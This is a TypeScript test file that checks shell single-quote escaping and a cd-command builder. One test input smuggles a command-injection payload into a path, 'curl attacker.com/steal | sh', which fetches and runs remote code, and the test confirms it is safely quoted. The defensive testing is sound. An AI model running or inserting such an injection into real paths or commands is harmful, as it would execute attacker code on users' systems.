import { describe, it, expect } from "vitest";
import { escapeForShellSingleQuote, cdCommand } from "./shell.ts";

describe("escapeForShellSingleQuote", () => {
  it("returns unchanged string when no single quotes present", () => {
    expect(escapeForShellSingleQuote("/tmp/my-repo")).toBe("/tmp/my-repo");
  });

  it("escapes a single quote in the middle of a string", () => {
    expect(escapeForShellSingleQuote("it's")).toBe("it'\\''s");
  });

  it("escapes multiple single quotes", () => {
    expect(escapeForShellSingleQuote("it's a 'test'")).toBe("it'\\''s a '\\''test'\\''");
  });

  it("escapes a single quote at the start", () => {
    expect(escapeForShellSingleQuote("'start")).toBe("'\\''start");
  });

  it("escapes a single quote at the end", () => {
    expect(escapeForShellSingleQuote("end'")).toBe("end'\\''");
  });

  it("handles empty string", () => {
    expect(escapeForShellSingleQuote("")).toBe("");
  });

  it("handles string that is only a single quote", () => {
    expect(escapeForShellSingleQuote("'")).toBe("'\\''");
  });
});

describe("cdCommand", () => {
  it("wraps a simple path in single quotes", () => {
    expect(cdCommand("/tmp/my-repo")).toBe("cd '/tmp/my-repo'");
  });

  it("escapes single quotes in paths", () => {
    expect(cdCommand("/tmp/it's-a-repo")).toBe("cd '/tmp/it'\\''s-a-repo'");
  });

  it("handles path with shell injection attempt", () => {
    const maliciousPath = "/tmp/x'; curl attacker.com/steal | sh; echo '";
    const result = cdCommand(maliciousPath);
    expect(result).toBe("cd '/tmp/x'\\''; curl attacker.com/steal | sh; echo '\\'''");
  });

  it("handles path with spaces", () => {
    expect(cdCommand("/tmp/my repo/path")).toBe("cd '/tmp/my repo/path'");
  });

  it("handles path with special characters but no single quotes", () => {
    expect(cdCommand("/tmp/$HOME/path")).toBe("cd '/tmp/$HOME/path'");
  });
});
